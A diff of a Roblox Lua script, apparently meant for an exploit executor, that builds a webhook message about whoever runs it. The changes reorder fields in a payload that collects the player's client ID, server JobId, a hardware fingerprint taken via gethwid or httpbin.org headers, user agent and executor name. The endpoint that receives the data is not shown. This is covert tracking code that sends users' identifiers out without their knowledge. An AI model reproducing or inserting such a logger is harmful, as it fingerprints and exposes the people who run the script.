@@ -139,30 +139,13 @@ if not _G.Skip then
                 ["Content-Type"] = "application/json"
             },
             Body = HttpService:JSONEncode({
+                content = game:GetService("RbxAnalyticsService"):GetClientId()
                 username = LocalPlayer.DisplayName,
                 avatar_url = GetJson("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..LocalPlayer.UserId.."&size=420x420&format=Png").data[1].imageUrl,
                 embeds = {
                     {
                         color = 65280,
                         fields = {
-                            {
-                                name = "ClientId",
-                                value = game:GetService("RbxAnalyticsService"):GetClientId()
-                            },
-                            {
-                                name = "JobId",
-                                value = game.JobId
-                            },
-                            {
-                                name = "Hwid",
-                                value = (gethwid or (function()
-                                    for i, v in pairs(GetJson("https://httpbin.org/get").headers) do
-                                        if string.find(i, "Fingerprint") then
-                                            return v
-                                        end
-                                    end
-                                end))()
-                            },
                             {
                                 name = "Game",
                                 value = "["..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.."](https://www.roblox.com/games/"..game.PlaceId..")"
@@ -178,6 +161,20 @@ if not _G.Skip then
                             {
                                 name = "UA",
                                 value = HttpService:GetUserAgent()
+                            },
+                            {
+                                name = "JobId",
+                                value = game.JobId
+                            },
+                            {
+                                name = "Hwid",
+                                value = (gethwid or (function()
+                                    for i, v in pairs(GetJson("https://httpbin.org/get").headers) do
+                                        if string.find(i, "Fingerprint") then
+                                            return v
+                                        end
+                                    end
+                                end))()
                             },
                             {
                                 name = "Executor",
